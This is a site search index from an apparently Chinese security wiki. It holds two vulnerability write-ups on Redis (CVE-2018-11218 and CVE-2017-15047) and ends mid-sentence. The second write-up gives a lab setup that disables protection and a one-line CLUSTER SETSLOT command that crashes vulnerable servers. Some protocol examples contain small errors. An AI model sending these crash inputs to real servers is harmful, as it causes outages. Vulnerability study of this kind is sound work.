{"pages":[{"title":"","date":"2021-06-28T12:52:22.791Z","path":"/404.html","text":"Error 404 Not Found - 页面君不见了哟~ 404 退散！ 您所访问的地址无法找到或者已经被删除了， 如果您是从搜索结果点击进来看到的 404，可以先尝试使用页面 右上方的搜索文章。 访问本站出现 404，一般是因为以下原因： 本站启用固定链接之后，搜索引擎未全面更新收录。所以有时候搜索结果里的文章链接是错误的。 来都来了，就先逛逛嘛~~ 您可以访问 本站主页 ，或者联系我，吐槽下问题的详细情况， 也可以通过页面上方的 分类 或 标签 来查看本站已有的一些 tags。"},{"title":"About","date":"2021-07-01T07:54:25.495Z","path":"about/index.html","text":"站在巨人的肩膀上，做一名安全圈知识的搬运工。"},{"title":"Categories","date":"2021-06-28T11:17:33.727Z","path":"categories/index.html","text":""},{"title":"Tags","date":"2021-06-28T11:17:33.736Z","path":"tags/index.html","text":""}],"posts":[{"title":"CVE-2018-11218_Redis Lua缓冲区溢出漏洞","date":"2021-07-06T09:02:00.000Z","path":"wiki/漏洞相关/Redis/CVE-2018-11218-Redis-Lua缓冲区溢出漏洞/","text":"漏洞信息漏洞简介 漏洞名称：Redis Lua子系统缓冲区溢出漏洞 漏洞编号：CVE-2018-11218 漏洞类型：缓冲区溢出 CVSS评分：【CVSS v2.0：】【CVSS v3.0：】 漏洞危害等级：高危 组件概述​ Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。 ​ 它通常被称为数据结构服务器，因为值（value）可以是 字符串(String), 哈希(Hash), 列表(list), 集合(sets) 和 有序集合(sorted sets)等类型。 漏洞概述​ Redis 3.2.12之前版本、4.0.10之前的4.x版本和5.0 RC2之前的5.x版本中的Lua子系统的cmsgpack库存在缓冲区溢出漏洞，该漏洞源于程序未能执行正确的内存操作。远程攻击者可通过发送请求利用该漏洞造成拒绝服务或执行任意代码。 漏洞利用条件​ 攻击者可以通过远程连接到redis-server服务器，发送命令执行cmsgpack.pack()函数，触发缓冲区溢出漏洞。 漏洞影响Redis:Labs Redis up to 3.2.12Redis:Labs Redis up to 4.0.10Redis:Labs Redis up to 5.0 RC2 漏洞修复https://github.com/redis/redis/commit/5ccb6f7a791bf3490357b00a898885759d98bab0 漏洞复现应用协议6379/RESP 漏洞复现 ​ poc内容为发送一段cmsgpack.pack函数的调用，注入大量的字符，导致拒绝服务。 ​ 发送后无回包 漏洞分析技术背景​ Redis是轻量级的，非易失性键值数据存储。 它通过Redis序列化协议（RESP）提供对简单易变数据结构的访问，该协议是基于TCP的协议。 与大多数其他数据库一样，Redis遵循客户端—服务器模型。 客户端能够通过Redis命令在Redis服务器上创建，修改和检索记录。 ​ 例如，以下命令创建“ TEST”字符串记录并将其分配给“ 1234”键值，将此记录修改为“ TEST2”并分别检索记录： 123SET 1234 TESTGETSET 1234 TEST2GET 1234 ​ 有关Redis命令的完整列表，请参考 http://redis.io/commands ​ Redis客户端通过端口6379通过TCP使用Redis序列化协议（RESP）与服务器进行通信。可通过 http://redis.io/topics/protocol获得该协议详细说明。 RESP使用五种数据类型，这些数据类型由相应数据的第一个字节标识： 简单字符串以“ +”字符开头 错误以“-”字符开头 整数以“：”字符开头 批量字符串以“ $”字符开头 数组以“ *”字符开头 ​ 批量字符串以“ $”字符开头，后跟相应字符串的长度。 以下重点介绍如何将“ Sangfor”表示为大容量字符串： 12$7 CRLFTELUS ​ 其中CRLF表示新的行序列回车（CR），后跟换行（LF）。 ​ RESP数组以“ *”字符开头，后跟数组中的元素数。 下面说明了一个由2个元素组成的大容量字符串数组： 12345*2 CRLF$7 CRLFSangfor CRLF$4 CRLFTEST CRLF ​ 所有Redis命令都通过RESP字符串数组发送到服务器。 例如，上述SET命令将以下形式发送： 1234567*3 CRLF$3 CRLFSET CRLF$4 CRLF1234 CRLF$4 CRLFTEST CRLF EVAL script numkeys key [key …] arg [arg …] 可用版本： &gt;= 2.6.0 时间复杂度： EVAL 和 EVALSHA 可以在 O(1) 复杂度内找到要被执行的脚本，其余的复杂度取决于执行的脚本本身。 ​ 从 Redis 2.6.0 版本开始，通过内置的 Lua 解释器，可以使用 EVAL 命令对 Lua 脚本进行求值。 ​ script 参数是一段 Lua 5.1 脚本程序，它会被运行在 Redis 服务器上下文中，这段脚本不必(也不应该)定义为一个 Lua 函数。 ​ numkeys 参数用于指定键名参数的个数。 ​ 键名参数 key [key ...] 从 EVAL 的第三个参数开始算起，表示在脚本中所用到的那些 Redis 键(key)，这些键名参数可以在 Lua 中通过全局变量 KEYS 数组，用 1 为基址的形式访问( KEYS[1] ， KEYS[2] ，以此类推)。 ​ 在命令的最后，那些不是键名参数的附加参数 arg [arg ...] ，可以在 Lua 中通过全局变量 ARGV 数组访问，访问的形式和 KEYS 变量类似( ARGV[1] 、 ARGV[2] ，诸如此类)。 ​ 上面这几段长长的说明可以用一个简单的例子来概括： 12345&gt; eval &quot;return &#123;KEYS[1],KEYS[2],ARGV[1],ARGV[2]&#125;&quot; 2 key1 key2 first second1) &quot;key1&quot;2) &quot;key2&quot;3) &quot;first&quot;4) &quot;second&quot; ​ 其中 &quot;return &#123;KEYS[1],KEYS[2],ARGV[1],ARGV[2]&#125;&quot; 是被求值的 Lua 脚本，数字 2 指定了键名参数的数量， key1 和 key2 是键名参数，分别使用 KEYS[1] 和 KEYS[2] 访问，而最后的 first 和 second 则是附加参数，可以通过 ARGV[1] 和 ARGV[2] 访问它们。 ​ 在 Lua 脚本中，可以使用两个不同函数来执行 Redis 命令，它们分别是： redis.call() redis.pcall() ​ 这两个函数的唯一区别在于它们使用不同的方式处理执行命令所产生的错误，在后面的『错误处理』部分会讲到这一点。 redis.call() 和 redis.pcall() 两个函数的参数可以是任何格式良好(well formed)的 Redis 命令： 12&gt; eval &quot;return redis.call(&#x27;set&#x27;,&#x27;foo&#x27;,&#x27;bar&#x27;)&quot; 0OK ​ 需要注意的是，上面这段脚本的确实现了将键 foo 的值设为 bar 的目的，但是，它违反了 EVAL 命令的语义，因为脚本里使用的所有键都应该由 KEYS 数组来传递，就像这样： 12&gt; eval &quot;return redis.call(&#x27;set&#x27;,KEYS[1],&#x27;bar&#x27;)&quot; 1 fooOK ​ 要求使用正确的形式来传递键(key)是有原因的，因为不仅仅是 EVAL 这个命令，所有的 Redis 命令，在执行之前都会被分析，籍此来确定命令会对哪些键进行操作。 ​ 因此，对于 EVAL 命令来说，必须使用正确的形式来传递键，才能确保分析工作正确地执行。除此之外，使用正确的形式来传递键还有很多其他好处，它的一个特别重要的用途就是确保 Redis 集群可以将你的请求发送到正确的集群节点。(对 Redis 集群的工作还在进行当中，但是脚本功能被设计成可以与集群功能保持兼容。)不过，这条规矩并不是强制性的，从而使得用户有机会滥用(abuse) Redis 单实例配置(single instance configuration)，代价是这样写出的脚本不能被 Redis 集群所兼容。 在 Lua 数据类型和 Redis 数据类型之间转换 ​ 当 Lua 通过 call() 或 pcall() 函数执行 Redis 命令的时候，命令的返回值会被转换成 Lua 数据结构。同样地，当 Lua 脚本在 Redis 内置的解释器里运行时，Lua 脚本的返回值也会被转换成 Redis 协议(protocol)，然后由 EVAL 将值返回给客户端。 ​ 数据类型之间的转换遵循这样一个设计原则：如果将一个 Redis 值转换成 Lua 值，之后再将转换所得的 Lua 值转换回 Redis 值，那么这个转换所得的 Redis 值应该和最初时的 Redis 值一样。 ​ 换句话说， Lua 类型和 Redis 类型之间存在着一一对应的转换关系。 ​ 以下列出的是详细的转换规则： ​ 从 Redis 转换到 Lua ： Redis integer reply -&gt; Lua number / Redis 整数转换成 Lua 数字 Redis bulk reply -&gt; Lua string / Redis bulk 回复转换成 Lua 字符串 Redis multi bulk reply -&gt; Lua table (may have other Redis data types nested) / Redis 多条 bulk 回复转换成 Lua 表，表内可能有其他别的 Redis 数据类型 Redis status reply -&gt; Lua table with a single ok field containing the status / Redis 状态回复转换成 Lua 表，表内的 ok 域包含了状态信息 Redis error reply -&gt; Lua table with a single err field containing the error / Redis 错误回复转换成 Lua 表，表内的 err 域包含了错误信息 Redis Nil bulk reply and Nil multi bulk reply -&gt; Lua false boolean type / Redis 的 Nil 回复和 Nil 多条回复转换成 Lua 的布尔值 false 从 Lua 转换到 Redis： Lua number -&gt; Redis integer reply / Lua 数字转换成 Redis 整数 Lua string -&gt; Redis bulk reply / Lua 字符串转换成 Redis bulk 回复 Lua table (array) -&gt; Redis multi bulk reply / Lua 表(数组)转换成 Redis 多条 bulk 回复 Lua table with a single ok field -&gt; Redis status reply / 一个带单个 ok 域的 Lua 表，转换成 Redis 状态回复 Lua table with a single err field -&gt; Redis error reply / 一个带单个 err 域的 Lua 表，转换成 Redis 错误回复 Lua boolean false -&gt; Redis Nil bulk reply / Lua 的布尔值 false 转换成 Redis 的 Nil bulk 回复 从 Lua 转换到 Redis 有一条额外的规则，这条规则没有和它对应的从 Redis 转换到 Lua 的规则： Lua boolean true -&gt; Redis integer reply with value of 1 / Lua 布尔值 true 转换成 Redis 整数回复中的 1 以下是几个类型转换的例子： 1234567891011&gt; eval &quot;return 10&quot; 0(integer) 10&gt; eval &quot;return &#123;1,2,&#123;3,&#x27;Hello World!&#x27;&#125;&#125;&quot; 01) (integer) 12) (integer) 23) 1) (integer) 3 2) &quot;Hello World!&quot;&gt; eval &quot;return redis.call(&#x27;get&#x27;,&#x27;foo&#x27;)&quot; 0&quot;bar&quot; ​ 在上面的三个代码示例里，前两个演示了如何将 Lua 值转换成 Redis 值，最后一个例子更复杂一些，它演示了一个将 Redis 值转换成 Lua 值，然后再将 Lua 值转换成 Redis 值的类型转过程。 脚本的原子性 ​ Redis 使用单个 Lua 解释器去运行所有脚本，并且， Redis 也保证脚本会以原子性(atomic)的方式执行：当某个脚本正在运行的时候，不会有其他脚本或 Redis 命令被执行。这和使用 MULTI / EXEC 包围的事务很类似。在其他别的客户端看来，脚本的效果(effect)要么是不可见的(not visible)，要么就是已完成的(already completed)。 ​ 另一方面，这也意味着，执行一个运行缓慢的脚本并不是一个好主意。写一个跑得很快很顺溜的脚本并不难，因为脚本的运行开销(overhead)非常少，但是当你不得不使用一些跑得比较慢的脚本时，请小心，因为当这些蜗牛脚本在慢吞吞地运行的时候，其他客户端会因为服务器正忙而无法执行命令。 错误处理 ​ 前面的命令介绍部分说过， redis.call() 和 redis.pcall() 的唯一区别在于它们对错误处理的不同。 ​ 当 redis.call() 在执行命令的过程中发生错误时，脚本会停止执行，并返回一个脚本错误，错误的输出信息会说明错误造成的原因： 12345redis&gt; lpush foo a(integer) 1redis&gt; eval &quot;return redis.call(&#x27;get&#x27;, &#x27;foo&#x27;)&quot; 0(error) ERR Error running script (call to f_282297a0228f48cd3fc6a55de6316f31422f5d17): ERR Operation against a key holding the wrong kind of value ​ 和 redis.call() 不同， redis.pcall() 出错时并不引发(raise)错误，而是返回一个带 err 域的 Lua 表(table)，用于表示错误： 12redis 127.0.0.1:6379&gt; EVAL &quot;return redis.pcall(&#x27;get&#x27;, &#x27;foo&#x27;)&quot; 0(error) ERR Operation against a key holding the wrong kind of value 带宽和 EVALSHA ​ EVAL 命令要求你在每次执行脚本的时候都发送一次脚本主体(script body)。Redis 有一个内部的缓存机制，因此它不会每次都重新编译脚本，不过在很多场合，付出无谓的带宽来传送脚本主体并不是最佳选择。 为了减少带宽的消耗， Redis 实现了 EVALSHA 命令，它的作用和 EVAL 一样，都用于对脚本求值，但它接受的第一个参数不是脚本，而是脚本的 SHA1 校验和(sum)。 EVALSHA 命令的表现如下： 如果服务器还记得给定的 SHA1 校验和所指定的脚本，那么执行这个脚本 如果服务器不记得给定的 SHA1 校验和所指定的脚本，那么它返回一个特殊的错误，提醒用户使用 EVAL 代替 EVALSHA 以下是示例： 1234567891011&gt; set foo barOK&gt; eval &quot;return redis.call(&#x27;get&#x27;,&#x27;foo&#x27;)&quot; 0&quot;bar&quot;&gt; evalsha 6b1bf486c81ceb7edf3c093f4c48582e38c0e791 0&quot;bar&quot;&gt; evalsha ffffffffffffffffffffffffffffffffffffffff 0(error) `NOSCRIPT` No matching script. Please use [EVAL](/commands/eval). ​ 客户端库的底层实现可以一直乐观地使用 EVALSHA 来代替 EVAL ，并期望着要使用的脚本已经保存在服务器上了，只有当 NOSCRIPT 错误发生时，才使用 EVAL 命令重新发送脚本，这样就可以最大限度地节省带宽。 ​ 这也说明了执行 EVAL 命令时，使用正确的格式来传递键名参数和附加参数的重要性：因为如果将参数硬写在脚本中，那么每次当参数改变的时候，都要重新发送脚本，即使脚本的主体并没有改变，相反，通过使用正确的格式来传递键名参数和附加参数，就可以在脚本主体不变的情况下，直接使用 EVALSHA 命令对脚本进行复用，免去了无谓的带宽消耗。 脚本缓存 ​ Redis 保证所有被运行过的脚本都会被永久保存在脚本缓存当中，这意味着，当 EVAL 命令在一个 Redis 实例上成功执行某个脚本之后，随后针对这个脚本的所有 EVALSHA 命令都会成功执行。 ​ 刷新脚本缓存的唯一办法是显式地调用 SCRIPT FLUSH 命令，这个命令会清空运行过的所有脚本的缓存。通常只有在云计算环境中，Redis 实例被改作其他客户或者别的应用程序的实例时，才会执行这个命令。 ​ 缓存可以长时间储存而不产生内存问题的原因是，它们的体积非常小，而且数量也非常少，即使脚本在概念上类似于实现一个新命令，即使在一个大规模的程序里有成百上千的脚本，即使这些脚本会经常修改，即便如此，储存这些脚本的内存仍然是微不足道的。 ​ 事实上，用户会发现 Redis 不移除缓存中的脚本实际上是一个好主意。比如说，对于一个和 Redis 保持持久化链接(persistent connection)的程序来说，它可以确信，执行过一次的脚本会一直保留在内存当中，因此它可以在流水线中使用 EVALSHA 命令而不必担心因为找不到所需的脚本而产生错误(稍候我们会看到在流水线中执行脚本的相关问题)。 SCRIPT 命令 Redis 提供了以下几个 SCRIPT 命令，用于对脚本子系统(scripting subsystem)进行控制： SCRIPT FLUSH ：清除所有脚本缓存 [SCRIPT EXISTS sha1 sha1 …] ：根据给定的脚本校验和，检查指定的脚本是否存在于脚本缓存 SCRIPT LOAD script ：将一个脚本装入脚本缓存，但并不立即运行它 SCRIPT KILL ：杀死当前正在运行的脚本 纯函数脚本 在编写脚本方面，一个重要的要求就是，脚本应该被写成纯函数(pure function)。 也就是说，脚本应该具有以下属性： 对于同样的数据集输入，给定相同的参数，脚本执行的 Redis 写命令总是相同的。脚本执行的操作不能依赖于任何隐藏(非显式)数据，不能依赖于脚本在执行过程中、或脚本在不同执行时期之间可能变更的状态，并且它也不能依赖于任何来自 I/O 设备的外部输入。 使用系统时间(system time)，调用像 RANDOMKEY 那样的随机命令，或者使用 Lua 的随机数生成器，类似以上的这些操作，都会造成脚本的求值无法每次都得出同样的结果。 为了确保脚本符合上面所说的属性， Redis 做了以下工作： Lua 没有访问系统时间或者其他内部状态的命令 Redis 会返回一个错误，阻止这样的脚本运行： 这些脚本在执行随机命令之后(比如 RANDOMKEY 、 [SRANDMEMBER key count] 或 TIME 等)，还会执行可以修改数据集的 Redis 命令。如果脚本只是执行只读操作，那么就没有这一限制。注意，随机命令并不一定就指那些带 RAND 字眼的命令，任何带有非确定性的命令都会被认为是随机命令，比如 TIME 命令就是这方面的一个很好的例子。 每当从 Lua 脚本中调用那些返回无序元素的命令时，执行命令所得的数据在返回给 Lua 之前会先执行一个静默(slient)的字典序排序(lexicographical sorting)。举个例子，因为 Redis 的 Set 保存的是无序的元素，所以在 Redis 命令行客户端中直接执行 SMEMBERS key ，返回的元素是无序的，但是，假如在脚本中执行 redis.call(&quot;smembers&quot;, KEYS[1]) ，那么返回的总是排过序的元素。 对 Lua 的伪随机数生成函数 math.random 和 math.randomseed 进行修改，使得每次在运行新脚本的时候，总是拥有同样的 seed 值。这意味着，每次运行脚本时，只要不使用 math.randomseed ，那么 math.random 产生的随机数序列总是相同的。 尽管有那么多的限制，但用户还是可以用一个简单的技巧写出带随机行为的脚本(如果他们需要的话)。 假设现在我们要编写一个 Redis 脚本，这个脚本从列表中弹出 N 个随机数。一个 Ruby 写的例子如下： 1234567891011121314151617require &#x27;rubygems&#x27;require &#x27;redis&#x27;r = Redis.newRandomPushScript = &lt;&lt;EOF local i = tonumber(ARGV[1]) local res while (i &gt; 0) do res = redis.call(&#x27;lpush&#x27;,KEYS[1],math.random()) i = i-1 end return resEOFr.del(:mylist)puts r.eval(RandomPushScript,[:mylist],[10,rand(2**32)]) 这个程序每次运行都会生成带有以下元素的列表： 1234567891011&gt; lrange mylist 0 -11) &quot;0.74509509873814&quot;2) &quot;0.87390407681181&quot;3) &quot;0.36876626981831&quot;4) &quot;0.6921941534114&quot;5) &quot;0.7857992587545&quot;6) &quot;0.57730350670279&quot;7) &quot;0.87046522734243&quot;8) &quot;0.09637165539729&quot;9) &quot;0.74990198051087&quot;10) &quot;0.17082803611217&quot; 上面的 Ruby 程序每次都只生成同样的列表，用途并不是太大。那么，该怎样修改这个脚本，使得它仍然是一个纯函数(符合 Redis 的要求)，但是每次调用都可以产生不同的随机元素呢？ 一个简单的办法是，为脚本添加一个额外的参数，让这个参数作为 Lua 的随机数生成器的 seed 值，这样的话，只要给脚本传入不同的 seed ，脚本就会生成不同的列表元素。 以下是修改后的脚本： 12345678910111213RandomPushScript = &lt;&lt;EOF local i = tonumber(ARGV[1]) local res math.randomseed(tonumber(ARGV[2])) while (i &gt; 0) do res = redis.call(&#x27;lpush&#x27;,KEYS[1],math.random()) i = i-1 end return resEOFr.del(:mylist)puts r.eval(RandomPushScript,1,:mylist,10,rand(2**32)) 尽管对于同样的 seed ，上面的脚本产生的列表元素是一样的(因为它是一个纯函数)，但是只要每次在执行脚本的时候传入不同的 seed ，我们就可以得到带有不同随机元素的列表。 Seed 会在复制(replication link)和写 AOF 文件时作为一个参数来传播，保证在载入 AOF 文件或附属节点(slave)处理脚本时， seed 仍然可以及时得到更新。 注意，Redis 实现保证 math.random 和 math.randomseed 的输出和运行 Redis 的系统架构无关，无论是 32 位还是 64 位系统，无论是小端(little endian)还是大端(big endian)系统，这两个函数的输出总是相同的。 全局变量保护 ​ 为了防止不必要的数据泄漏进 Lua 环境， Redis 脚本不允许创建全局变量。如果一个脚本需要在多次执行之间维持某种状态，它应该使用 Redis key 来进行状态保存。 ​ 企图在脚本中访问一个全局变量(不论这个变量是否存在)将引起脚本停止， EVAL 命令会返回一个错误： 12redis 127.0.0.1:6379&gt; eval &#x27;a=10&#x27; 0(error) ERR Error running script (call to f_933044db579a2f8fd45d8065f04a8d0249383e57): user_script:1: Script attempted to create global variable &#x27;a&#x27; ​ Lua 的 debug 工具，或者其他设施，比如打印（alter）用于实现全局保护的 meta table ，都可以用于实现全局变量保护。 ​ 实现全局变量保护并不难，不过有时候还是会不小心而为之。一旦用户在脚本中混入了 Lua 全局状态，那么 AOF 持久化和复制（replication）都会无法保证，所以，请不要使用全局变量。 ​ 避免引入全局变量的一个诀窍是：将脚本中用到的所有变量都使用 local 关键字定义为局部变量。 库 Redis 内置的 Lua 解释器加载了以下 Lua 库： base table string math debug cjson cmsgpack 其中 cjson 库可以让 Lua 以非常快的速度处理 JSON 数据，除此之外，其他别的都是 Lua 的标准库。 每个 Redis 实例都保证会加载上面列举的库，从而确保每个 Redis 脚本的运行环境都是相同的。 cmsgpack ​ Lua-cmsgpack是MessagePack的一个实现，它是一个Lua 5.1 / 5.2 / 5.3在一个没有外部依赖性的自包含C文件中的绑定。 该库是根据BSD两条款许可获得许可的开源软件。 用法 导出的API非常简单，包含四个功能： 基本API： 12msgpack = cmsgpack.pack(lua_object1, lua_object2, ..., lua_objectN)lua_object1, lua_object2, ..., lua_objectN = cmsgpack.unpack(msgpack) 详细的API使您可以更好地控制解压缩多个值： 1234567resume_offset, lua_object1 = cmsgpack.unpack_one(msgpack)resume_offset1, lua_object2 = cmsgpack.unpack_one(msgpack, resume_offset)...-1, lua_objectN = cmsgpack.unpack_one(msgpack, resume_offset_previous)resume_offset, lua_object1, lua_object2 = cmsgpack.unpack_limit(msgpack, 2)resume_offset2, lua_object3 = cmsgpack.unpack_limit(msgpack, 1, resume_offset1) 作用： pack(arg1, arg2, ..., argn)-将任意数量的lua对象打包到一个msgpack流中。返回：msgpack unpack(msgpack)-将msgpack中的所有对象解压缩为单独的返回值。返回：object1，object2，…，objectN unpack_one(msgpack); unpack_one(msgpack, offset)-偏移后解压缩第一个对象。返回：偏移量，对象 unpack_limit(msgpack, limit); unpack_limit(msgpack, limit, offset)-解压缩第一个limit对象并返回：offset，object1，objet2，…，objectN（上限，但如果没有很多要解压缩的对象，则返回的数量可能少于限制） ​ 当您使用unpack_one或到达输入流的末尾时，将返回unpack_limit的偏移量-1。 ​ 你可能会require &quot;msgpack&quot;也可能会require &quot;msgpack.safe&quot;。安全版本将错误返回为（nil，errstring）。 ​ 但是，由于Lua数字和表类型的性质，必须很好地理解库的一些行为，以避免出现问题： 仅当所有键均由以1开头，以N结尾，不带孔且没有其他非数字键的增量整数组成时，表才转换为MessagePack数组类型。所有其他表都将转换为映射。 空表总是转换为MessagePack数组，其理由是空列表比空映射（通常用于表示具有字段的对象）更为常见。 如果floor（number）== number，则Lua数字将转换为整数类型，否则将其转换为MessagePack浮点或双精度值。 当Lua数转换为float或double时，如果与double表示相比不损失精度，则首选前者。 将MessagePack大整数（64位）转换为Lua编号时，结果编号可能不会代表原始编号，而只是一个近似值。这是不可避免的，因为Lua数值类型通常是双精度浮点类型。 详细分析​ deps/lua/src/lua_cmsgpack.c 流量分析​ 发送cmsgpack.pack调用，并设置超多的超长字符串参数 参考资料 https://github.com/redis/redis/commit/52a00201fca331217c3b4b8b634f6a0f57d6b7d3 https://github.com/redis/redis/commit/90b6337c155aa0330143f5b0a0af1d430271d400 https://gist.github.com/antirez/82445fcbea6d9b19f97014cc6cc79f8a https://gist.github.com/antirez/bca0ad7a9c60c72e9600c7f720e9d035 http://antirez.com/news/119 https://github.com/redis/redis/issues/5017","tags":[{"name":"Redis","slug":"Redis","permalink":"http://example.com/tags/Redis/"}],"categories":[{"name":"漏洞相关","slug":"漏洞相关","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/"},{"name":"Redis","slug":"漏洞相关/Redis","permalink":"http://example.com/categories/%E6%BC%8F%E6%B4%9E%E7%9B%B8%E5%85%B3/Redis/"}]},{"title":"CVE-2017-15047_Redis数组索引越界漏洞","date":"2021-07-06T08:54:19.000Z","path":"wiki/漏洞相关/Redis/CVE-2017-15047-Redis数组索引越界漏洞/","text":"漏洞信息漏洞简介 漏洞名称：Redis cluster.c clusterLoadConfig数组索引越界漏洞 漏洞编号：CVE-2017-15047 漏洞类型：缓冲区错误 CVSS评分：【CVSS v2.0：】【CVSS v3.0：9.8】 漏洞危害等级：高危 组件概述​ Redis（Remote Dictionary Server )，即远程字典服务，是一个开源的使用ANSI C语言编写、支持网络、可基于内存亦可持久化的日志型、Key-Value数据库，并提供多种语言的API。 ​ 它通常被称为数据结构服务器，因为值（value）可以是 字符串(String), 哈希(Hash), 列表(list), 集合(sets) 和 有序集合(sorted sets)等类型。 漏洞概述​ Redis 4.0.2版本中的cluster.c文件的‘clusterLoadConfig’函数存在安全漏洞。攻击者可利用该漏洞造成拒绝服务（越边界数组索引和应用程序崩溃）。 漏洞利用条件​ redis-server以集群形式部署，攻击者可以访问到redis-server。 漏洞影响​ Redis up to 4.0.2 漏洞修复https://github.com/redis/redis/commit/ffcf7d5ab1e98d84c28af9bea7be76c6737820ad 漏洞复现应用协议6379/RESP 环境安装/搭建​ 在环境共享服务器中获取到环境源码\\安装包，地址为:\\\\10.251.0.11\\R-Redis\\redis-3.2.7.tar.zip文件，解压编译即可。 ​ 启动前先更改配置文件redis.conf，开启集群模式。 12345678910111213141516171819202122232425################################ REDIS CLUSTER ################################集群开关，默认是不开启集群模式。cluster-enabled yes#集群配置文件的名称，每个节点都有一个集群相关的配置文件，持久化保存集群的信息。这个文件并不需要手动配置，这个配置文件有Redis生成并更新，每个Redis集群节点需要一个单独的配置文件，请确保与实例运行的系统中配置文件名称不冲突cluster-config-file nodes-7021.conf#节点互连超时的阀值。集群节点超时毫秒数cluster-node-timeout 30000#在进行故障转移的时候，全部slave都会请求申请为master，但是有些slave可能与master断开连接一段时间了，导致数据过于陈旧，这样的slave不应该被提升&gt;为master。该参数就是用来判断slave节点与master断线的时间是否过长。判断方法是：#比较slave断开连接的时间和(node-timeout * slave-validity-factor) + repl-ping-slave-period#如果节点超时时间为三十秒, 并且slave-validity-factor为10,假设默认的repl-ping-slave-period是10秒，即如果超过310秒slave将不会尝试进行故障转移#可能出现由于某主节点失联却没有从节点能顶上的情况，从而导致集群不能正常工作，在这种情况下，只有等到原来的主节点重新回归到集群，集群才恢复运作#如果设置成０，则无论从节点与主节点失联多久，从节点都会尝试升级成主节cluster-slave-validity-factor 10#master的slave数量大于该值，slave才能迁移到其他孤立master上，如这个参数若被设为2，那么只有当一个主节点拥有2 个可工作的从节点时，它的一个从节&gt;点会尝试迁移。#主节点需要的最小从节点数，只有达到这个数，主节点失败时，它从节点才会进行迁移。# cluster-migration-barrier 1#默认情况下，集群全部的slot有节点分配，集群状态才为ok，才能提供服务。设置为no，可以在slot没有全部分配的时候提供服务。不建议打开该配置，这样会造成分区的时候，小分区的master一直在接受写请求，而造成很长时间数据不一致。#在部分key所在的节点不可用时，如果此参数设置为”yes”(默认值), 则整个集群停止接受操作；如果此参数设置为”no”，则集群依然为可达节点上的key提供读&gt;操作cluster-require-full-coverage yes ​ 注释bind 127.0.0.1，开启远程访问。 ​ 关闭保护模式. 漏洞复现​ 在攻击机上发送cluster setslot命令，创建一个大于16384的槽号，为了达到拒绝服务目的。 1redis-cli -h 10.251.0.36 CLUSTER SETSLOT 16385 NODE node ​ 复现redis-server报错 ​ 配置redis.conf，按照redis.conf配置启动靶机的redis-server。 1redis-server redis.conf ​ 靶机上测试一下命令： 1CLUSTER SETSLOT 16385 NODE node ​ 发现已经修复了此漏洞，redis-server对槽号大小做了边界检查。 ​ 远程测试也是报此错误。 漏洞分析技术背景​ Redis是轻量级的，非易失性键值数据存储。 它通过Redis序列化协议（RESP）提供对简单易变数据结构的访问，该协议是基于TCP的协议。 与大多数其他数据库一样，Redis遵循客户端—服务器模型。 客户端能够通过Redis命令在Redis服务器上创建，修改和检索记录。 ​ 例如，以下命令创建“ TEST”字符串记录并将其分配给“ 1234”键值，将此记录修改为“ TEST2”并分别检索记录： 123SET 1234 TESTGETSET 1234 TEST2GET 1234 ​ 有关Redis命令的完整列表，请参考 http://redis.io/commands ​ Redis客户端通过端口6379通过TCP使用Redis序列化协议（RESP）与服务器进行通信。可通过 http://redis.io/topics/protocol获得该协议详细说明。 RESP使用五种数据类型，这些数据类型由相应数据的第一个字节标识： 简单字符串以“ +”字符开头 错误以“-”字符开头 整数以“：”字符开头 批量字符串以“ $”字符开头 数组以“ *”字符开头 ​ 批量字符串以“ $”字符开头，后跟相应字符串的长度。 以下重点介绍如何将“ Sangfor”表示为大容量字符串： 12$7 CRLFTELUS ​ 其中CRLF表示新的行序列回车（CR），后跟换行（LF）。 ​ RESP数组以“ *”字符开头，后跟数组中的元素数。 下面说明了一个由2个元素组成的大容量字符串数组： 12345*2 CRLF$7 CRLFSangfor CRLF$4 CRLFTEST CRLF ​ 所有Redis命令都通过RESP字符串数组发送到服务器。 例如，上述SET命令将以下形式发送： 1234567*3 CRLF$3 CRLFSET CRLF$4 CRLF1234 CRLF$4 CRLFTEST CRLF ​ Lua是Redis 支持的轻量级脚本语言。 Redis内置了Lua解释器。Lua在Redis中的使用方法，可参考https://www.redisgreen.net/blog/intro-to-lua-for-redis-programmers/ 一、Redis Cluster简单概述 1. Redis Cluster特点 多主多从，去中心化：从节点作为备用，复制主节点，不做读写操作，不提供服务 不支持处理多个key：因为数据分散在多个节点，在数据量大高并发的情况下会影响性能； 支持动态扩容节点：这是Rerdis Cluster最大的优点之一； 节点之间相互通信，相互选举，不再依赖sentinel：准确来说是主节点之间相互“监督”，保证及时故障转移 2.Redis Cluster与其它集群模式的区别 相比较sentinel模式，多个master节点保证主要业务（比如master节点主要负责写）稳定性，不需要搭建多个sentinel实例监控一个master节点； 相比较一主多从的模式，不需要手动切换，具有自我故障检测，故障转移的特点； 相比较其他两个模式而言，对数据进行分片（sharding），不同节点存储的数据是不一样的； 从某种程度上来说，Sentinel模式主要针对高可用（HA），而Cluster模式是不仅针对大数据量，高并发，同时也支持HA。 二、Redis Cluster如何集群实现？ 1.Redis Cluster是如何将数据分片的？—-哈希槽Slot （1）哈希槽介绍 ​ Redis集群使用一种称作一致性哈希的复合分区形式（组合了哈希分区和列表分袂的特征来计算键的归属实例），键的CRC16哈希值被称为哈希槽。比如对于三个Redis节点，哈希槽的分配方式如下： 第一个节点拥有0-5500哈希槽 第二节点拥有5501-11000哈希槽 第三节点拥有剩余的11001-16384哈希槽 一个键的对应的哈希槽通过计算键的CRC16 哈希值，然后对16384进行取模得到：HASH_SLOT=CRC16(key) modulo 16383，Redis提供了CLUSTER KEYSLOT命令来执行哈希槽的计算： 1CLUSTER KEYSLOT name 集群在线重配置（live reconfiguration） ​ Redis 集群支持在集群运行的过程中添加或者移除节点。 ​ 实际上， 节点的添加操作和节点的删除操作可以抽象成同一个操作， 那就是， 将哈希槽从一个节点移动到另一个节点： 添加一个新节点到集群， 等于将其他已存在节点的槽移动到一个空白的新节点里面。 从集群中移除一个节点， 等于将被移除节点的所有槽移动到集群的其他节点上面去。 ​ 因此， 实现 Redis 集群在线重配置的核心就是将槽从一个节点移动到另一个节点的能力。 因为一个哈希槽实际上就是一些键的集合， 所以 Redis 集群在重哈希（rehash）时真正要做的， 就是将一些键从一个节点移动到另一个节点。 ​ 要理解 Redis 集群如何将槽从一个节点移动到另一个节点， 我们需要对 CLUSTER 